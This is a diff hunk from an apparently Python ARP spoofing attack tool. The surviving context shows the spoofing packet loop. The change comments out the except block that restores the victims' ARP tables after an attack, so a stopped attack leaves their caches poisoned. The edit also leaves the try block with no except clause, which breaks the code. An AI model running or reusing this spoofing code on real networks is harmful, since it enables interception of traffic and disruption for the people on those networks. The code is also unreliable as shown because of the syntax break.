@@ -418,17 +418,17 @@ def arpspoof():
             print("\r ARP Spoofing packets sent: "+str(integ), end="")
             integ += 4
             time.sleep(1)
-    except:
-        print("\n\n[Info] --> The attack is stopped, and all the ARP tables will be restored - please wait ....")
-        mact = getm(ipo)
-        macs = getm(iptw)
-        packetre = sc.ARP(op=2,hwdst=mact,pdst=ipo,psrc=iptw,hwsrc=macs)
-        sc.send(packetre,verbose=False,count=3)
-        packetree = sc.ARP(op=2,hwdst=macs,pdst=iptw,psrc=ipo,hwsrc=mact)
-        sc.send(packetree, verbose=False, count=3)
-        print("[Info] --> All the ARP tables of the targets are restored ")
-        time.sleep(2)
-        exit()
+    #except:
+        #print("\n\n[Info] --> The attack is stopped, and all the ARP tables will be restored - please wait ....")
+        #mact = getm(ipo)
+        #macs = getm(iptw)
+        #packetre = sc.ARP(op=2,hwdst=mact,pdst=ipo,psrc=iptw,hwsrc=macs)
+        #sc.send(packetre,verbose=False,count=3)
+        #packetree = sc.ARP(op=2,hwdst=macs,pdst=iptw,psrc=ipo,hwsrc=mact)
+        #sc.send(packetree, verbose=False, count=3)
+        #print("[Info] --> All the ARP tables of the targets are restored ")
+        #time.sleep(2)
+        #exit()
 
 
 def getm(ip):
